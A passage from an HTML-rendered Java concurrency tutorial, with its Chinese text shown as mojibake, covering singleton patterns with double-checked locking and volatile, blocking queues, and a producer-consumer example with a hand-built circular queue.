class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSingleton</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Singleton.getInstance();</span><br><span class="line"> </span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong><br>1.å°†instance è®¾ä¸ºé™æ€æˆå‘˜ï¼Œåœ¨Singletonç±»è¢«åŠ è½½çš„æ—¶å€™è¿›è¡Œå®ä¾‹åˆ›å»ºï¼ˆç±»åŠ è½½åˆ›å»ºï¼‰<br>2.é€šè¿‡æ­¤æ–¹æ³•è·å–newå‡ºæ¥çš„å®ä¾‹ï¼Œå…¶ä»–ä»£ç å—åç»­æƒ³ä¸€ç›´ä½¿ç”¨è¿™ä¸ªç±»(è·å–è¿™ä¸ªç±»å”¯ä¸€çš„å®ä¾‹)ï¼Œä½¿ç”¨getInstanceæ–¹æ³•å³å¯.<br>3.private Singleton() {} æ˜¯åœ¨è®¾ç½®ç§æœ‰æ„é€ æ–¹æ³•,ä¿è¯å…¶å®ƒä»£ç ä¸èƒ½åˆ›å»ºå‡ºæ–°çš„å¯¹è±¡.</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/e2c8e21f7fb02f10fb990f48e53fb982.png" alt="img"></p><h5 id="æ‡’æ±‰æ¨¡å¼"><a href="#æ‡’æ±‰æ¨¡å¼" class="headerlink" title="æ‡’æ±‰æ¨¡å¼"></a>æ‡’æ±‰æ¨¡å¼</h5><p><strong>åˆ›å»ºçš„æ¯”è¾ƒè¿Ÿï¼Œé¦–æ¬¡ä½¿ç”¨çš„æ—¶å€™æ‰åˆ›å»º.</strong></p><h6 id="å•çº¿ç¨‹ç‰ˆ"><a href="#å•çº¿ç¨‹ç‰ˆ" class="headerlink" title="å•çº¿ç¨‹ç‰ˆ"></a>å•çº¿ç¨‹ç‰ˆ</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SingletonLazy</span> &#123;</span><br><span class="line">    <span class="comment">//å…ˆå°†å¼•ç”¨åˆå§‹åŒ–ä¸ºnull ä¸ç«‹å³åˆ›å»ºå®ä¾‹</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SingletonLazy</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SingletonLazy <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">SingletonLazy</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SingletonLazy</span><span class="params">()</span> &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong><br>1.é¦–æ¬¡ä½¿ç”¨instanceçš„æ—¶å€™æ‰çœŸæ­£åˆ›å»ºå®ä¾‹.ï¼ˆä¸è°ƒç”¨å°±ä¸åˆ›å»ºï¼‰<br>2.ç¬¬ä¸€æ¬¡è°ƒç”¨getInstanceæ—¶ï¼Œinstanceå¼•ç”¨ä¸ºnullï¼Œè¿›å…¥ifåˆ›å»ºå‡ºçš„å®ä¾‹å¯ä»¥æŒç»­è°ƒç”¨çš„å®ä¾‹.</p><h6 id="å¯¹æ¯”"><a href="#å¯¹æ¯”" class="headerlink" title="å¯¹æ¯”"></a>å¯¹æ¯”</h6><p><strong>1.æ‡’æ±‰æ¨¡å¼æ¯”é¥¿æ±‰æ¨¡å¼æ•ˆç‡æ›´é«˜.</strong></p><p><strong>2.é¥¿æ±‰æ¨¡å¼æ›´å…·çº¿ç¨‹å®‰å…¨ï¼Œé¥¿æ±‰æ¨¡å¼getInstanceåªè¿›è¡Œè¯»å–ï¼Œæ‡’æ±‰æ¨¡å¼å¯¹æ•°æ®æ—¢ä¼šè¯»å–æ•°æ®åˆä¼šä¿®æ”¹æ•°æ®.</strong></p><p>çº¿ç¨‹å®‰å…¨é—®é¢˜å‘ç”Ÿåœ¨é¦–æ¬¡åˆ›å»ºå®ä¾‹æ—¶ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹åŒæ—¶è°ƒç”¨getInstanceæ–¹æ³•å¯¹å˜é‡è¿›è¡Œä¿®æ”¹å°±å¯èƒ½å¯¼è‡´çº¿ç¨‹å®‰å…¨é—®é¢˜.<br>æ€ä¹ˆè§£å†³å‘¢ï¼Ÿsynchronizedï¼</p><h6 id="å¤šçº¿ç¨‹ç‰ˆ"><a href="#å¤šçº¿ç¨‹ç‰ˆ" class="headerlink" title="å¤šçº¿ç¨‹ç‰ˆ"></a>å¤šçº¿ç¨‹ç‰ˆ</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é—®é¢˜æ¥äº†ğŸ˜€.è¿™ä¹ˆå†™åç»­æ¯æ¬¡è°ƒç”¨getInstanceéƒ½éœ€è¦å…ˆåŠ é”ï¼Œä½†å®é™…ä¸Šæ‡’æ±‰æ¨¡å¼çº¿ç¨‹å®‰å…¨é—®é¢˜åªå‡ºç°åœ¨newå¯¹è±¡æ—¶ï¼Œ**ä¸€ä½†å¯¹è±¡newå‡ºæ¥åç»­å¤šçº¿ç¨‹è°ƒç”¨getInstanceåªæœ‰è¯»æ“ä½œäº†ï¼Œå°±ä¸å­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜äº†.**ã€åŠ é”å°±å¯èƒ½æ¶‰åŠåˆ°é”å†²çªä¸€å†²çªå°±ä¼šå¼•èµ·é˜»å¡å’Œé«˜æ€§èƒ½æ— ç¼˜ã€‘<br><strong>è§£å†³æ–¹æ¡ˆ</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;<span class="comment">//ç¬¬ä¸€ä¸ªifåˆ¤å®šçš„æ˜¯æ˜¯å¦åŠ é”(ä¿è¯æ‰§è¡Œæ•ˆç‡)</span></span><br><span class="line">            <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line">                <span class="keyword">if</span>(instance == <span class="literal">null</span>) &#123;<span class="comment">//ç¬¬äºŒä¸ªifåˆ¤å®šçš„æ˜¯æ˜¯å¦è¦åˆ›å»ºå¯¹è±¡(ä¿éšœçº¿ç¨‹å®‰å…¨)</span></span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>åœ¨å¤–å±‚å†åŠ ä¸€å±‚ifåˆ¤æ–­ï¼ˆå¦‚æœinstanceä¸ºnullï¼Œå³ä¸ºé¦–æ¬¡è°ƒç”¨-&gt;æ˜¯å¦éœ€è¦åŠ é”ï¼Œénull-&gt;åç»­ä¼šè°ƒç”¨-&gt;ä¸ç”¨åŠ é”ï¼‰<br>ä½†æ˜¯åˆæœ‰æƒŠå–œæ¥äº†ï¼æŒ‡ä»¤é‡æ’åºï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">instacnce = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br></pre></td></tr></table></figure><p>è¿™æ¡è¯­å¥æ‰§è¡Œæœ‰ä¸‰ä¸ªæŒ‡ä»¤<br>1.ç”³è¯·ä¸€æ®µå†…å­˜ç©ºé—´<br>2.åœ¨å†…å­˜ä¸Šè°ƒç”¨æ„é€ æ–¹æ³•ï¼Œåˆ›å»ºå‡ºå®ä¾‹<br>3.æŠŠå†…å­˜åœ°å€èµ‹å€¼ç»™instance<br>å‰é¢ç»™å¤§å®¶ä»‹ç»è¿‡ï¼Œè¿™äº›æŒ‡ä»¤æ­£å¸¸æƒ…å†µä¸‹æŒ‰é¡ºåºæ‰§è¡Œï¼Œä½†CPU å¯ä»¥ä¼šè‡ªå·±è¿›è¡Œä¼˜åŒ–æ‰“ä¹±é¡ºåº.<br>æ€ä¹ˆè§£å†³ï¼Ÿ<br>volatileå…³é”®å­—ï¼ï¼ˆé˜²æ­¢æŒ‡ä»¤é‡æ’åºï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;<span class="comment">//ç¬¬ä¸€ä¸ªifåˆ¤å®šçš„æ˜¯æ˜¯å¦åŠ é”(ä¿è¯æ‰§è¡Œæ•ˆç‡)</span></span><br><span class="line">            <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line">                <span class="keyword">if</span>(instance == <span class="literal">null</span>) &#123;<span class="comment">//ç¬¬äºŒä¸ªifåˆ¤å®šçš„æ˜¯æ˜¯å¦è¦åˆ›å»ºå¯¹è±¡(ä¿éšœçº¿ç¨‹å®‰å…¨)</span></span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="é˜»å¡é˜Ÿåˆ—"><a href="#é˜»å¡é˜Ÿåˆ—" class="headerlink" title="é˜»å¡é˜Ÿåˆ—"></a>é˜»å¡é˜Ÿåˆ—</h4><h5 id="ä»€ä¹ˆæ˜¯é˜»å¡é˜Ÿåˆ—"><a href="#ä»€ä¹ˆæ˜¯é˜»å¡é˜Ÿåˆ—" class="headerlink" title="ä»€ä¹ˆæ˜¯é˜»å¡é˜Ÿåˆ—"></a>ä»€ä¹ˆæ˜¯é˜»å¡é˜Ÿåˆ—</h5><p>é˜»å¡é˜Ÿåˆ—æ˜¯ä¸€ç§ç‰¹æ®Šçš„é˜Ÿåˆ—ï¼Œéµå®ˆâ€å…ˆè¿›å…ˆå‡ºâ€åŸåˆ™.ã€å…¸å‹çš„ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹ã€‘</p><h5 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h5><p>1.é˜Ÿåˆ—æ»¡çš„æ—¶å€™ç»§ç»­å…¥é˜Ÿä¼šé˜»å¡ï¼Œç›´åˆ°æœ‰å…¶ä»–çº¿ç¨‹ä»é˜Ÿåˆ—ä¸­å–èµ°å…ƒç´ .<br>2.é˜Ÿåˆ—ç©ºæ—¶ç»§ç»­å‡ºé˜Ÿä¹Ÿä¼šé˜»å¡ï¼Œç›´åˆ°æœ‰å…¶ä»–çº¿ç¨‹ç‹é˜Ÿåˆ—ä¸­æ’å…¥å…ƒç´ .</p><h5 id="ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹"><a href="#ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹" class="headerlink" title="ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹"></a>ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹</h5><p><strong>åˆ†å¸ƒå¼ç³»ç»Ÿ</strong>åœ¨å®é™…å¼€å‘ä¸­ç»å¸¸æ¶‰åŠï¼Œæ ¸å¿ƒæ˜¯åˆ†å¼€å·¥ä½œå‘æŒ¥æ•ˆæœ.æœåŠ¡å™¨æ•´ä¸ªåŠŸèƒ½çš„å®ç°æ˜¯ç”±æ¯ä¸ªæœåŠ¡å™¨å•ç‹¬è´Ÿè´£ä¸€éƒ¨åˆ†å·¥ä½œå®ç°çš„ï¼Œé€šè¿‡å„ä¸ªæœåŠ¡å™¨ä¹‹é—´çš„ç½‘ç»œé€šä¿¡å®Œæˆæ•´ä¸ªåŠŸèƒ½.<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/a76c32c0095637c65fd46b6420e6f5e2.png" alt="img"><br><strong>æ³¨æ„</strong><br>1.ä¸Šè¿°çš„é˜»å¡é˜Ÿåˆ—æ˜¯åŸºäºå¯¹åº”æ•°æ®ç»“æ„å®ç°çš„æœåŠ¡å™¨ç¨‹åºï¼Œè¢«éƒ¨ç½²åˆ°å•ç‹¬çš„ä¸»æœºä¸Š.æ•´ä¸ªç³»ç»Ÿçš„ç»“æ„æ›´å¤æ‚.<br>2.å¼•å…¥é˜»å¡é˜Ÿåˆ—åœ¨Aå‘é€è¯·æ±‚åˆ°Bæ¥æ”¶æ˜¯æœ‰å¼€é”€æŸè€—çš„.</p><h6 id="è§£è€¦åˆ"><a href="#è§£è€¦åˆ" class="headerlink" title="è§£è€¦åˆ"></a>è§£è€¦åˆ</h6><p>é˜»å¡é˜Ÿåˆ—èƒ½ä½¿ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…è§£è€¦åˆ.<br>é«˜è€ƒå®Œçš„æš‘å‡æƒ³èµšç‚¹å°é’±ï¼Œä½ å’Œä½ çš„æœ‹å‹å¼€å§‹æ‘†æ‘Šå–å†°æ±¤åœ†ï¼Œæ¯ä¸ªäººéƒ½æœ‰æ˜ç¡®çš„åˆ†å·¥.ï¼ˆæ˜¯çš„æˆ‘æ˜¯å¤§é¦‹ä¸«å¤´ï¼‰å°Aè´Ÿè´£é‡‡è´­ææ–™ï¼Œå°Bè´Ÿè´£åˆ¶ä½œï¼Œå°Cè´Ÿè´£é…é€ï¼Œä½ è´Ÿè´£å®£ä¼ å’Œçœ‹åŸç®¡.é¡¾å®¢æ˜¯â€œæ¶ˆè´¹è€…â€ï¼Œä¸éœ€è¦å…³æ³¨ä½ ä»¬ä½œä¸ºâ€œç”Ÿäº§è€…â€è°åšäº†å†°æ±¤åœ†.æœ‰åƒå°±è¡Œ.</p><h6 id="å‰Šå³°å¡«è°·"><a href="#å‰Šå³°å¡«è°·" class="headerlink" title="å‰Šå³°å¡«è°·"></a>å‰Šå³°å¡«è°·</h6><p>é˜»å¡é˜Ÿåˆ—ç›¸å½“äºä¸€ä¸ªç¼“å†²åŒºï¼Œå¹³è¡¡äº†ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¹‹é—´çš„å¤„ç†èƒ½åŠ›.<br>618å¤§æŠ¢è´­ï¼Œä¸€åˆ†é’Ÿä¹‹å†…å¯èƒ½ä¼šäº§ç”Ÿæ•°ç™¾ä¸‡è®¢å•ï¼ŒæœåŠ¡å™¨åœ¨åŒä¸€æ—¶åˆ»æ”¶åˆ°å¤§é‡çš„æ”¯ä»˜è¯·æ±‚ï¼Œç›´æ¥å¤„ç†æœåŠ¡å™¨å—ä¸äº†ä¼šå´©æºƒï¼Œï¼ˆä¸€ä¸ªè¯·æ±‚è€—è´¹çš„èµ„æºå°‘ä½†ç§¯ç´¯é‡å˜äº§ç”Ÿè´¨å˜ï¼Œä»»ä½•ä¸€ç§ç¡¬ä»¶èµ„æºè¾¾åˆ°ç“¶é¢ˆæœåŠ¡å™¨éƒ½ä¼šå¯„ï¼‰<br>è¿™æ—¶å€™å°±æ˜¯é˜»å¡é˜Ÿåˆ—å¤§æ˜¾èº«æ‰‹çš„æ—¶å€™ï¼Œå°†è¯·æ±‚éƒ½æ”¾åˆ°ä¸€ä¸ªé˜»å¡é˜Ÿåˆ—ä¸­,ç„¶åå†ç”±æ¶ˆè´¹è€…çº¿ç¨‹æ…¢æ…¢æ¥å¤„ç†æ¯ä¸ªæ”¯ä»˜è¯·æ±‚.</p><h6 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCustomerAndProducer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        BlockingQueue&lt;Integer&gt; blockingQueue = <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Integer&gt;();</span><br><span class="line"> </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">customer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">           <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> blockingQueue.take();</span><br><span class="line">                   System.out.println(<span class="string">&quot;Consumption element: &quot;</span> + value);</span><br><span class="line">                   Thread.sleep(<span class="number">500</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;customer&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> r.nextInt(<span class="number">1000</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot; Production elements: &quot;</span> + num);</span><br><span class="line">                    blockingQueue.put(num);</span><br><span class="line">                    Thread.sleep(<span class="number">300</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;procedure&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        customer.start();</span><br><span class="line">        producer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å®ç°é˜»å¡é˜Ÿåˆ—"><a href="#å®ç°é˜»å¡é˜Ÿåˆ—" class="headerlink" title="å®ç°é˜»å¡é˜Ÿåˆ—"></a>å®ç°é˜»å¡é˜Ÿåˆ—</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlockingQueue</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] elems = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2000</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">head</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">tail</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getSize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> value)</span> <span class="keyword">throws</span> InterruptedException&#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(locker)&#123;</span><br><span class="line">            <span class="keyword">while</span>(size &gt;= elems.length) &#123;</span><br><span class="line">                <span class="comment">//æ»¡ é˜»å¡ç­‰å¾…</span></span><br><span class="line">                locker.wait();</span><br><span class="line">            &#125;</span><br><span class="line">            elems[tail] = value;</span><br><span class="line">            tail = (tail + <span class="number">1</span>) % elems.length;</span><br><span class="line">            size++;</span><br><span class="line">            <span class="comment">//å…¥é˜Ÿåå”¤é†’</span></span><br><span class="line">            locker.notify();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line">            <span class="keyword">while</span>(size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//é˜Ÿåˆ—ç©ºç»§ç»­é˜»å¡</span></span><br><span class="line">                locker.wait();</span><br><span class="line">            &#125;</span><br><span class="line">            ret = elems[head];</span><br><span class="line">            head = (head + <span class="number">1</span>) % elems.length;</span><br><span class="line">            size--;</span><br><span class="line">            <span class="comment">//å‡ºé˜ŸæˆåŠŸåå”¤é†’</span></span><br><span class="line">            locker.notify();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong><br>1.ä½¿ç”¨<strong>å¾ªç¯é˜Ÿåˆ—</strong>å®ç°ï¼ˆæ³¨æ„ç†è§£å¤´æŒ‡é’ˆå’Œå°¾æŒ‡é’ˆçš„å˜åŒ–ï¼‰<br>2.<strong>putå’Œtakeä½¿ç”¨çš„æ˜¯åŒä¸€æŠŠé”</strong>ï¼Œè‹¥é˜Ÿåˆ—è¢«putæ»¡ä¹‹ååˆå”¤é†’äº†å¦ä¸€ä¸ªé˜»å¡çš„putå°±ä¼šå‡ºbugï¼Œ<strong>åŠ while</strong>åˆ¤æ–­ï¼Œå¦‚æœé˜Ÿåˆ—ä¸€ç›´æ˜¯æ…¢çš„å°±ä¸å†è¢«å”¤é†’ï¼Œä¿è¯å®‰å…¨æ€§.</p><h5 id="æ ‡å‡†åº“ä¸­çš„é˜»å¡é˜Ÿåˆ—"><a href="#æ ‡å‡†åº“ä¸­çš„é˜»å¡é˜Ÿåˆ—" class="headerlink" title="æ ‡å‡†åº“ä¸­çš„é˜»å¡é˜Ÿåˆ—"></a>æ ‡å‡†åº“ä¸­çš„é˜»å¡é˜Ÿåˆ—</h5><p>åœ¨ Java æ ‡å‡†åº“ä¸­å†…ç½®äº†é˜»å¡é˜Ÿåˆ—. å¦‚æœæˆ‘ä»¬éœ€è¦åœ¨ä¸€äº›ç¨‹åºä¸­ä½¿ç”¨é˜»å¡é˜Ÿåˆ—, ç›´æ¥ä½¿ç”¨æ ‡å‡†åº“ä¸­çš„å³å¯.<br>1.BlockingQueue æ˜¯ä¸€ä¸ªæ¥å£. çœŸæ­£å®ç°çš„ç±»æ˜¯ LinkedBlockingQueue.<br>2.put 